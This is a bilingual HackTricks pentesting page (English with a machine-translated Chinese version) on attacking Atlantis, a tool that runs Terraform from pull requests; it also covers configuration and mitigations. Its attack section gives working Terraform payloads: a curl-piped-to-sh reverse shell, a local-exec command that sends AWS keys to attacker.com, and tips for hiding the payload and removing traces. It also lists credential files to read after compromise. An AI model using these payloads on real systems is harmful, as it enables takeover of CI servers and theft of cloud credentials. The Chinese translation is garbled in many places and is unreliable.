# Atlantis

## Atlantis

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

*您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

*发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

*获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

** **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth
* **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

***通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>

## Basic Information

＃＃ 基本信息

Atlantis basically helps you to to run terraform from Pull Requests from your git server.

Atlantis基本上可以帮助您从GIT服务器中的拉动请求中运行Terraform。

![](<../.gitbook/assets/image (307) (3).png>)

## Local Lab

1. Go to the **atlantis releases page** in [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) and **download** the one that suits you.

1.在[https://github.com/runatlantis/atlantis/releases] at ** Atlantis发布页面** ** 一个适合你的人。
2. Create a **personal token** (with repo access) of your **github** user

2.创建** github **用户的**个人令牌**（带有回购访问）
3. Execute `./atlantis testdrive` and it will create a **demo repo** you can use to **talk to atlantis**

3.执行`./atlantis testdrive`，它将创建一个** demo repo **您可以使用**与Atlantis **交谈
   1. You can access the web page in 127.0.0.1:4141

1.您可以在127.0.0.1:4141中访问网页

## Atlantis Access

## Atlantis访问

### Git Server Credentials

### git服务器凭据

**Atlantis** support several git hosts such as **Github**, **Gitlab**, **Bitbucket** and **Azure DevOps**.\

** atlantis **支持多个git主机，例如** github **，** gitlab **，** bitbucket **和** azure devops **。
However, in order to access the repos in those platforms and perform actions, it needs to have some **privileged access granted to them** (at least write permissions).\

但是，为了访问这些平台中的存储库并执行操作，它需要给他们一些**特权访问**（至少写许可）。\ \ \ \
[**The docs**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) encourage to create a user in these platform specifically for Atlantis, but some people might use personal accounts.

[**文档**]（https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional）鼓励在这些平台中为Atlantis创建一个用户，但是 有些人可能会使用个人帐户。

{% hint style="warning" %}

{％提示样式=“警告”％}
In any case, from an attackers perspective, the **Atlantis account** is going to be one very **interesting** **to compromise**.

无论如何，从攻击者的角度来看，** Atlantis帐户**将是一个非常**有趣的** **，以妥协**。
{% endhint %}

### Webhooks

Atlantis uses optionally [**Webhook secrets**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) to validate that the **webhooks** it receives from your Git host are **legitimate**.

Atlantis选择使用[** Webhook Secrets **]（https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret）来验证** Webhooks **它是从** Webhooks **接收到的** 您的git主机**合法**。

One way to confirm this would be to **allowlist requests to only come from the IPs** of your Git host but an easier way is to use a Webhook Secret.

确认这一点的一种方法是**允许列表请求仅来自您的git主机的IPS **，但更简单的方法是使用webhook秘密。

Note that unless you use a private github or bitbucket server, you will need to expose webhook endpoints to the Internet.

请注意，除非您使用私人GitHub或Bitbucket服务器，否则您将需要将Webhook端点公开到Internet。

{% hint style="warning" %}

{％提示样式=“警告”％}
Atlantis is going to be **exposing webhooks** so the git server can send it information. From an attackers perspective it would be interesting to know **if you can send it messages**.

Atlantis将**曝光Webhooks **，以便GIT服务器可以发送信息。 从攻击者的角度来看，如果您可以发送消息**，那么知道**会很有趣。
{% endhint %}

### Provider Credentials <a href="#provider-credentials" id="provider-credentials"></a>

Atlantis runs Terraform by simply **executing `terraform plan` and `apply`** commands on the server **Atlantis is hosted on**. Just like when you run Terraform locally, Atlantis needs credentials for your specific provider.

Atlantis通过**执行``Terraform Plan''并在服务器上** Apraplans ** Atlantis在**上托管了``Apply' **）命令来运行Terraform。 就像当您在本地运行Terraform时一样，Atlantis也需要特定提供商的凭据。

It's up to you how you [provide credentials](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) for your specific provider to Atlantis:

您如何为您的特定提供者提供[https://www.runatlantis.io/docs/provider-credentials.html#-specific-info）如何提供[https://www.runatlantis.io/www.runatlantis.io/www.runatlantis.io to to atlantis：

* The Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) and [AWS Fargate Module](https://www.runatlantis.io/docs/deployment.html#aws-fargate) have their own mechanisms for provider credentials. Read their docs.

* Atlantis [Helm图]（https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart）和[aws fargate module]（https：///wwwwwwwww.runatlantis.io/deplayment 。 阅读他们的文档。
* If you're running Atlantis in a cloud then many clouds have ways to give cloud API access to applications running on them, ex:

*如果您在云中运行Atlantis，那么许多云都可以使云API访问对它们上运行的应用程序的访问，例如：
  * [AWS EC2 Roles](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Search for "EC2 Role")

* [AWS EC2角色]（https://registry.terraform.io/providers/hashicorp/aws/latest/docs）（搜索“ EC2角色”）
  * [GCE Instance Service Accounts](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)

* [GCE实例服务帐户]（https://registry.terraform.io/providers/hashicorp/google/google/latest/docs/guides/guides/provider \ _reference）
* Many users set environment variables, ex. `AWS_ACCESS_KEY`, where Atlantis is running.

*许多用户设置了环境变量，例如。 `aws_access_key`，Atlantis正在运行的地方。
* Others create the necessary config files, ex. `~/.aws/credentials`, where Atlantis is running.

*其他人创建必要的配置文件，例如。 `〜/.aws/recertentials'，亚特兰蒂斯正在运行的地方。
* Use the [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) to obtain provider credentials.

*使用[Hashicorp Vault Provider]（https://registry.terraform.io/providers/hashicorp/hashicorp/vault/latest/docs）获取提供商凭据。

{% hint style="warning" %}

{％提示样式=“警告”％}
The **container** where **Atlantis** is **running** will highly probably **contain privileged credentials** to the providers (AWS, GCP, Github...) that Atlantis is managing via Terraform.

** atlantis **的**容器**在**运行**可能会**可能** Atlantis通过Terraform管理的提供商（AWS，GCP，GITHUB ...）包含特权凭据**。
{% endhint %}

### Web Page

By default Atlantis will run a **web page in the port 4141 in localhost**. This page just allows you to enable/disable atlantis apply and check the plan status of the repos and unlock them (it doesn't allow to modify things, so it isn't that useful).

默认情况下，Atlantis将在Localhost **的端口4141中运行**网页。 此页面只允许您启用/禁用Atlantis应用并检查存储库的计划状态并解锁它们（它不允许修改事物，因此这不用有用）。

You probably won't find it exposed to the internet, but it looks like by default **no credentials are needed** to access it (and if they are `atlantis`:`atlantis` are the **default** ones).

您可能不会发现它暴露于Internet，但是默认情况下**不需要凭据**访问它（如果它们是``Atlantis''：`atlantis`是**默认**一个） 。

## Server Configuration

##服务器配置

Configuration to `atlantis server` can be specified via command line flags, environment variables, a config file or a mix of the three.

可以通过命令线标志，环境变量，配置文件或三个组合来指定“ Atlantis Server”的配置。

* You can find [**here the list of flags**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) supported by Atlantis server

*您可以在这里找到[** flags **]（https://www.runatlantis.io/docs/server-configuration.html#server-configuration）由Atlantis Server支持
* You can find [**here how to transform a config option into an env var**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)\*\*\*\*

*您可以在这里找到[**在这里如何将配置选项转换为env var **]（https://www.runatlantis.io/docs/server-configuration.html#envoriranment-variaionbles）\*\*\*\*\* \*

Values are **chosen in this order**:

值**按以下顺序选择**：

1. Flags
2. Environment Variables
3. Config File

{% hint style="warning" %}

{％提示样式=“警告”％}
Note that in the configuration you might find interesting values such as **tokens and passwords**.

请注意，在配置中，您可能会发现有趣的值，例如**令牌和密码**。
{% endhint %}

### Repos Configuration

### Repos Configuration

Some configurations affects **how the repos are managed**. However, it's possible that **each repo require different settings**, so there are ways to specify each repo. This is the priority order:

一些配置会影响**如何管理存储库**。 但是，**每个存储库都可能需要不同的设置**，因此有一些方法可以指定每个仓库。 这是优先顺序：

1. Repo [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) file. This file can be used to specify how atlantis should treat the repo. However, by default some keys cannot be specified here without some flags allowing it.

1. repo [**`/atlantis.yml` **]（https://www.runatlantis.io/docs/repo-level-level-atlantis-yaml.html.html#repo-level-level-level-level-atlantis-yaml-config）文件。 该文件可用于指定Atlantis如何处理回购。 但是，默认情况下，如果没有某些标志允许它，则无法在此处指定一些键。
   1. Probably required to be allowed by flags like `allowed_overrides` or `allow_custom_workflows`

1.可能需要由``wasse_overrides''或`lasson_custom_workflows`允许的标志允许
2. \*\*\*\*[**Server Side Config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): You can pass it with the flag `--repo-config` and it's a yaml configuring new settings for each repo (regexes supported)

2. \*\*\*\*[**服务器端config **]（https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config）：您 可以使用标志`-repo-config`将其传递给它，并且是为每个仓库配置新设置的YAML（支持的正则是）
3. **Default** values

**PR Protections**

** PR保护**

Atlantis allows to indicate if you want the **PR** to be **`approved`** by somebody else (even if that isn't set in the branch protection) and/or be \*\*`mergeable` \*\* (branch protections passed) **before running apply**. From a security point of view, to set both options a recommended.

Atlantis允许指出您是否希望** pr **被别人批准**（即使在分支保护中没有设置的）和/或BE \*\*`\*`\*`\*`\* *\*（通过分支保护）**在运行之前**。 从安全的角度来看，可以设置两个选项。

In case `allowed_overrides` is True, these setting can be **overwritten on each project by the `/atlantis.yml` file**.

如果“ wasse_overrides”为true，则可以在每个项目上**覆盖这些设置。/atlantis.yml`文件**。

**Scripts**

The repo config can **specify scripts** to run [**before**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) \*\*\*\* (_pre workflow hooks_) and [**after**](https://www.runatlantis.io/docs/post-workflow-hooks.html) \*\*\*\* (_post workflow hooks_) a **workflow is executed.**

回购配置可以**指定脚本**在**]之前运行[**]（https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage）\*\*\*\*\*\*\*\* （_pre工作流挂钩_）和[**之后]（https://www.runatlantis.io/docs/post-workflow-hooks.html） 执行工作流程。**

There isn't any option to allow **specifying** these scripts in the \*\*repo `/atlantis.yml` \*\* file.

没有任何选项可以允许**指定**这些脚本在\*\*repo`/atlantis.yml` \*\*文件中。

**Workflow**

**工作流**

In the repo config (server side config) you can [**specify a new default workflow**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow), or [**create new custom workflows**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** You can also **specify** which **repos** can **access** the **new** ones generated.\

在repo config（服务器端配置）中，您可以[**指定新的默认工作流**]（https://www.runatlantis.io/docs/server-side-side-repo-config.html#chchange-change-the-default -atlantis-workflow）或[**创建新的自定义工作流**]（https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows）**。 指定**哪个** repos **可以**访问** **新**生成的**。
\*\*\*\*Then, you can allow the **atlantis.yaml** file of each repo to **specify the workflow to use.**

\*\*\*\*然后，您可以允许** atlantis.yaml **文件的文件**指定要使用的工作流。**

{% hint style="danger" %}
If the flag \*\*\*\* `allow_custom_workflows` is set to **True**, workflows can be **specified** in the **`atlantis.yaml`** file of each repo.\

如果flag \*\*\*\*`允许_custom_workflows`被设置为** true **，则可以在** atlantis.yaml` ** file the ** fileflows ** fileflows ** true **。
This will basically give **RCE in the Atlantis server to any user that can access that repo**.

这基本上将为Atlantis服务器中的** rce提供给任何可以访问该回购**的用户。

```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
  workflow: custom1
workflows:
  custom1:
    plan:
      steps:
      - init
      - run: my custom plan command
    apply:
      steps:
      - run: my custom apply command
```
{% endhint %}

**Conftest Policy Checking**

** Conftest政策检查**

Atlantis supports running **server-side** [**conftest**](https://www.conftest.dev) **policies** against the plan output. Common usecases for using this step include:

Atlantis支持运行**服务器端** [** Conftest **]（https://www.conftest.dev）**策略**针对计划输出。 使用此步骤的常见用途包括：

* Denying usage of a list of modules

*拒绝使用模块列表
* Asserting attributes of a resource at creation time

*在创建时间断言资源的属性
* Catching unintentional resource deletions

* Catching unintentional resource deletions
* Preventing security risks (ie. exposing secure ports to the public)

*防止安全风险（即向公众公开安全端口）

You can check how to configure it in [**the docs**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

您可以在[** docs **]（https://www.runatlantis.io/docs/policy-checking.html#how-it-works）中检查如何配置它。

## Atlantis Commands

## atlantis命令

\*\*\*\*[**In the docs**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) you can find the options you can use to run Atlantis:

\*\*\*\*[**在docs **]（https://www.runatlantis.io/docs/ususe-atlantis.html#using-atlantis） 亚特兰蒂斯：

```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
#Options:
# -d directory
# -p project
# --verbose
# You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
#Options:
# -d directory
# -p project
# -w workspace
# --auto-merge-disabled
# --verbose
# You can also add extra terraform options 
```

## Attacks

{% hint style="warning" %}

{％提示样式=“警告”％}
If during the exploitation you find this **error**: `Error: Error acquiring the state lock`

如果在剥削期间发现此**错误**：`错误：错误获取状态锁

You can fix it by running:

您可以通过运行来解决它：

```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis plan RCE - Config modification in new PR

### Atlantis Plan RCE-新PR中的配置修改

If you have write access over a repository you will be able to create a new branch on it and generate a PR. If you can \*\*execute `atlantis plan` \*\* (or maybe it's automatically executed) **you will be able to RCE inside the Atlantis server**.

如果您在存储库上写了访问权限，则可以在其上创建一个新分支并生成PR。 如果您可以\*\*执行`atlantis plan` \*\*（或者也许是自动执行的）**您将能够在Atlantis Server **内使用。

You can do this by making [**Atlantis load an external data source**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Just put a payload like the following in the `main.tf` file:

您可以通过制作[** atlantis加载外部数据源**]（https://registry.terraform.io/providers/hashicorp/hashicorp/external/latest/latest/data-sources/data-sources/data-source）来做到这一点。 只需在“ main.tf`文件：

```json
data "external" "example" {
  program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```

**Stealthier Attack**

**隐形攻击**

You can perform this attack even in a **stealthier way**, by following this suggestions:

通过遵循此建议，您也可以以**隐形的方式进行此攻击：

* Instead of adding the rev shell directly into the terraform file, you can **load an external resource** that contains the rev shell:

*您可以**加载包含Rev Shell的外部资源**，而不是将Rev Shell直接添加到Terraform文件中：

```javascript
module "not_rev_shell" {
  source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```

You can find the rev shell code in [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

_MODULE \ _REV \ _SHELL/TREE/MAIM/模块）

* In the external resource, use the **ref** feature to hide the **terraform rev shell code in a branch** inside of the repo, something like: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

*在外部资源中，使用** ref **功能将** Terraform Rev Shell代码隐藏在仓库内的分支**中，例如：`git@github.com：carlospolop/terraform_external_module_module_rev_shell //模块吗？ ref = b401d2b`
* **Instead** of creating a **PR to master** to trigger Atlantis, **create 2 branches** (test1 and test2) and create a **PR from one to the other**. When you have completed the attack, just **remove the PR and the branches**.

***而不是**创建一个** pr向主**触发atlantis，**创建2个分支**（test1和test2），并创建一个** pr从一个到另一个**。 完成攻击后，只需**删除PR和分支**。

### Atlantis apply RCE - Config modification in new PR

### Atlantis应用RCE-新pr中的配置修改

If you have write access over a repository you will be able to create a new branch on it and generate a PR. If you can **execute `atlantis apply` you will be able to RCE inside the Atlantis server**.

如果您在存储库上写了访问权限，则可以在其上创建一个新分支并生成PR。 如果您可以**执行`antlantis应用`您将能够在Atlantis Server **内使用。

However, you will usually need to bypass some protections:

但是，您通常需要绕过一些保护：

* **Mergeable**: If this protection is set in Atlantis, you can only run **`atlantis apply` if the PR is mergeable** (which means that the branch protection need to be bypassed).

***合并**：如果在Atlantis中设置了此保护，则只能运行** A atlantis如果PR是合并**（这意味着需要绕过分支保护）。
  * Check potential [**branch protections bypasses**](github-security/#branch-protection-bypass)\*\*\*\*

*检查电势[**分支保护绕过**]（github-security/＃branch-protection-bypass）\*\*\*\*\*\*
* **Approved**: If this protection is set in Atlantis, some **other user must approve the PR** before you can run `atlantis apply`

***批准**：如果在Atlantis设置了此保护
  * By default you can abuse the [**Gitbot token to bypass this protection**](github-security/#github\_token)\*\*\*\*

*默认情况下，您可以滥用[** gitbot令牌绕过此保护**]（github-security/＃github \ _token）\*\*\*\*\*\*\*

Running **`terraform apply` on a malicious Terraform file with** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\

运行**``Terraform在恶意地Terraform上使用** [** local-exec **]（https://www.terraform.io/docs/provisioners/local-exec.html）** **。**。 \ \
\*\*\*\* You just need to make sure some payload like the following ones ends in the `main.tf` file:

\*\*\*\*您只需要确保一些有效载荷像以下有效负载在`main.tf`文件中结束：

```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
  provisioner "local-exec" {
    command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
  }
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
  provisioner "local-exec" {
    command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
  }
}
```

Follow the **suggestions from the previous technique** the perform this attack in a **stealthier way**.

遵循以前技术的**建议，以**隐身的方式执行此攻击。

### Terraform Param Injection

### Terraform参数注入

When running `atlantis plan` or `atlantis apply` terraform is being run under-needs, you can pass commands to terraform from atlantis commenting something like:

在运行“亚特兰蒂斯计划”或“ Atlantis Appla” Terraform的情况下，您可以将命令传递给Terraform，从Atlantis评论以下内容：

```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```

Something you can pass are env variables which might be helpful to bypass some protections. Check terraform env vars in [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

您可以通过的东西是ENV变量，可能有助于绕过一些保护。 检查[https://www.terraform.io/cli/config/environment-variables]（

### Custom Workflow

###自定义工作流程

Running **malicious custom build commands** specified in an `atlantis.yaml` file. Atlantis uses the `atlantis.yaml` file from the pull request branch, **not** of `master`.\

运行**恶意自定义构建命令**在A atlantis.yaml`文件中指定。 Atlantis使用“ atlantis.yaml”文件中的``pull request barking''文件，**不是`master。
This possibility was mentioned in a previous section:

在上一节中提到了这种可能性：

{% hint style="danger" %}
If the flag \*\*\*\* `allow_custom_workflows` is set to **True**, workflows can be **specified** in the **`atlantis.yaml`** file of each repo.\

如果flag \*\*\*\*`允许_custom_workflows`被设置为** true **，则可以在** atlantis.yaml` ** file the ** fileflows ** fileflows ** true **。
This will basically give **RCE in the Atlantis server to any user that can access that repo**.

这基本上将为Atlantis服务器中的** rce提供给任何可以访问该回购**的用户。

```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
  workflow: custom1
workflows:
  custom1:
    plan:
      steps:
      - init
      - run: my custom plan command
    apply:
      steps:
      - run: my custom apply command
```
{% endhint %}

### PR Hijacking

If someone sends **`atlantis plan/apply` comments on your valid pull requests,** it will cause terraform to run when you don't want it to.

如果有人向您的有效拉请请求发送**`ATLANTIS计划/应用“评论”，则**将导致Terraform在您不需要时运行。

Moreover, if you don't have configured in the **branch protection** to ask to **reevaluate** every PR when a **new commit is pushed** to it, someone could **write malicious configs** (check previous scenarios) in the terraform config, run `atlantis plan/apply` and gain RCE.

此外，如果您没有在**分支保护中配置**，以要求**重新评估** ** **新提交** **，则有人可以**写恶意配置**（ 在Terraform配置中检查以前的方案），运行“ Atlantis Plan/Apply”并获得RCE。

This is the **setting** in Github branch protections:

这是GitHub分支保护中的**设置**：

![](<../.gitbook/assets/image (307) (4).png>)

### Webhook Secret

If you manage to **steal the webhook secret** used or if there **isn't any webhook secret** being used, you could **call the Atlantis webhook** and **invoke atlatis commands** directly.

如果您设法**窃取了使用的Webhook Secret **，或者没有使用任何Webhook Secret **，则可以**直接调用Atlantis webhook **和** Invoke Atlatis命令**。

### Bitbucket

Bitbucket Cloud does **not support webhook secrets**. This could allow attackers to **spoof requests from Bitbucket**. Ensure you are allowing only Bitbucket IPs.

Bitbucket Cloud **不支持Webhook Secret **。 这可以允许攻击者** Bitbucket **的欺骗请求。 确保您仅允许Bitbucket IP。

* This means that an **attacker** could make **fake requests to Atlantis** that look like they're coming from Bitbucket.

*这意味着一个**攻击者**可以向Atlantis **提出**虚假的请求，就像它们来自Bitbucket。
* If you are specifying `--repo-allowlist` then they could only fake requests pertaining to those repos so the most damage they could do would be to plan/apply on your own repos.

*如果您要指定`-Repo-allyList`，那么他们只能伪造与这些存储库有关的请求，因此他们可能造成的最大损害是计划/申请自己的存储库。
* To prevent this, allowlist [Bitbucket's IP addresses](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (see Outbound IPv4 addresses).

*为防止这种情况，允许列表[BitBucket的IP地址]（https://confluence.atlassian.com/bitbucket/what-are-are-the-the-bitbucket-cloud-ip-ip-ip-addresses-i-s-i-i-i should-should-should-should-should-should-should-should-configure-my-my-my-my-my-my-my-my-my- Corporate-Firewall-343343385.html）（请参阅出站IPv4地址）。

## Post-Exploitation

If you managed to get access to the server or at least you got a LFI there are some interesting things you should try to read:

如果您设法访问了服务器，或者至少您获得了LFI，那么您应该尝试阅读一些有趣的东西：

* `/home/atlantis/.git-credentials` Contains vcs access credentials

*`/home/atlantis/.git-credentials`包含VCS访问凭据
* `/atlantis-data/atlantis.db` Contains vcs access credentials with more info

*`/atlantis-data/atlantis.db`包含VCS访问凭据，并提供更多信息
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Terraform stated file

*`/atlantis-data/repos/<org_name>`_`/`_ _` <repo_name>/<pr_num>/<workspace>/<Path_to_dir>/。terraform/。terraform/terraform.tfstate
  * Example: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Env variables
* `/proc/[2-20]/cmdline` Cmd line of `atlantis server` (may contain sensitive data)

*`/proc/[2-20]/cmdline“ atlantis Server”的CMD线（可能包含敏感数据）

## Mitigations

##缓解

### Don't Use On Public Repos <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

###不要在公共仓库中<a href="#don-t-t-use-on-public-repos" id="dondon-don-t-use-in-public-repos"> </a>

Because anyone can comment on public pull requests, even with all the security mitigations available, it's still dangerous to run Atlantis on public repos without proper configuration of the security settings.

因为任何人都可以对公共拉动请求发表评论，即使有所有可用的安全性缓解，也可以在不正确配置安全设置的情况下在公共存储库上运行Atlantis仍然是危险的。

### Don't Use `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

###不要使用`-allow-fork-prs` <a href="#don-t-t-use-wallo-allow-fork-prs" id="dondon-don-t-use-lase-allow fork-prs">> </a>

If you're running on a public repo (which isn't recommended, see above) you shouldn't set `--allow-fork-prs` (defaults to false) because anyone can open up a pull request from their fork to your repo.

如果您正在使用公共仓库（不推荐，请参见上文），您不应该设置`` -  allow forkprs'（默认为false） 你的仓库。

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

###`-repo-allyList` <a href="#repo-allowlist" id="repo-allowlist"> </a>

Atlantis requires you to specify a allowlist of repositories it will accept webhooks from via the `--repo-allowlist` flag. For example:

Atlantis要求您指定一个存储库的允许列表，它将通过`-Repo-allyList`标志接受Webhooks。 例如：

* Specific repositories: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`

*特定的存储库：`-repo-allyList = github.com/runatlantis/atlantis，github.com/runatlantis/atlantis-tests`
* Your whole organization: `--repo-allowlist=github.com/runatlantis/*`

*您的整个组织：`-repo-allyList = github.com/runatlantis/*```
* Every repository in your GitHub Enterprise install: `--repo-allowlist=github.yourcompany.com/*`

*您的github企业安装中的每个存储库：`-repo-allyList = github.yourcompany.com/*````
* All repositories: `--repo-allowlist=*`. Useful for when you're in a protected network but dangerous without also setting a webhook secret.

*所有存储库：` -  repo-allaList =*`。 当您进入受保护的网络时，但也没有设置Webhook Secret，这对您有用。

This flag ensures your Atlantis install isn't being used with repositories you don't control. See `atlantis server --help` for more details.

此标志可确保您无法控制的存储库不使用您的Atlantis安装。 有关更多详细信息，请参见“ Atlantis Server -Help”。

### Protect Terraform Planning <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

###保护Terraform计划<a href="#protect-terraform-planning" id="protect-terraform-planning"> </a>

If attackers submitting pull requests with malicious Terraform code is in your threat model then you must be aware that `terraform apply` approvals are not enough. It is possible to run malicious code in a `terraform plan` using the [`external` data source](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) or by specifying a malicious provider. This code could then exfiltrate your credentials.

如果攻击者在威胁模型中提交带有恶意地Terraform代码的拉力请求，则必须意识到“ Terraform Apply”批准还不够。 可以使用[``外部数据源]（https://registry.terraform.io/providers/hashicorp/hashicorp/hashicorp/external/latest/docs/data-sources/data-sources/data-sources/data-_source）在“ Terraform计划”中运行恶意代码。 ）或通过指定恶意提供商。 然后，此代码可以剥落您的凭据。

To prevent this, you could:

为了防止这种情况，您可以：

1. Bake providers into the Atlantis image or host and deny egress in production.

1.将提供商烘烤到亚特兰蒂斯图像或主机中，并拒绝出现生产。
2. Implement the provider registry protocol internally and deny public egress, that way you control who has write access to the registry.

2.内部实施提供商注册表协议并拒绝公共出口，这样您就可以控制谁对注册表进行了访问。
3. Modify your [server-side repo configuration](https://www.runatlantis.io/docs/server-side-repo-config.html)'s `plan` step to validate against the use of disallowed providers or data sources or PRs from not allowed users. You could also add in extra validation at this point, e.g. requiring a "thumbs-up" on the PR before allowing the `plan` to continue. Conftest could be of use here.

3.修改您的[服务器端回购配置]（https://www.runatlantis.io/docs/server-side-repo-config.html）'s“计划步骤” 来自不允许用户的来源或PR。 您也可以在这一点上添加额外的验证，例如 在允许``计划''继续之前需要对公关上的“大拇指”。 Conftest可能在这里使用。

### Webhook Secrets <a href="#webhook-secrets" id="webhook-secrets"></a>

### Webhook Secrets <a href="#webhook-secrets" id="webhook-secrets"> </a>

Atlantis should be run with Webhook secrets set via the `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` environment variables. Even with the `--repo-allowlist` flag set, without a webhook secret, attackers could make requests to Atlantis posing as a repository that is allowlisted. Webhook secrets ensure that the webhook requests are actually coming from your VCS provider (GitHub or GitLab).

应通过`$ atlantis_gh_webhook_secret`/`$ atlantis_gitlab_webhook_secret`环境变量设置的Webhook秘密运行Atlantis。 即使使用`` -  repo-allyList`标志''设置，而无需Webhook Secret，攻击者也可以向Atlantis提出允许列入允许列表的存储库的请求。 Webhook Secrets确保Webhook请求实际上来自您的VCS提供商（GitHub或Gitlab）。

If you are using Azure DevOps, instead of webhook secrets add a basic username and password.

如果您使用的是Azure DevOps，而不是Webhook Secret添加基本的用户名和密码。

[**#**](https://www.runatlantis.io/docs/security.html#azure-devops-basic-authentication)**Azure DevOps Basic Authentication**

[**＃**]（https://www.runatlantis.io/docs/security.html#azure-devops-basic-authentication）** azure devops Basic devops Basic devops **

Azure DevOps supports sending a basic authentication header in all webhook events. This requires using an HTTPS URL for your webhook location.

Azure DevOps支持在所有Webhook事件中发送基本身份验证标头。 这需要在您的Webhook位置使用HTTPS URL。

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

### ssl/https <a href="#ssl-https" id="sssl-https"> </a>

If you're using webhook secrets but your traffic is over HTTP then the webhook secrets could be stolen. Enable SSL/HTTPS using the `--ssl-cert-file` and `--ssl-key-file` flags.

如果您使用的是Webhook Secrets，但是您的流量超过了HTTP，那么Webhook Secret可能会被盗。 使用`-ssl-cert-file`和`-ssl-key-file`标志启用SSL/HTTPS。

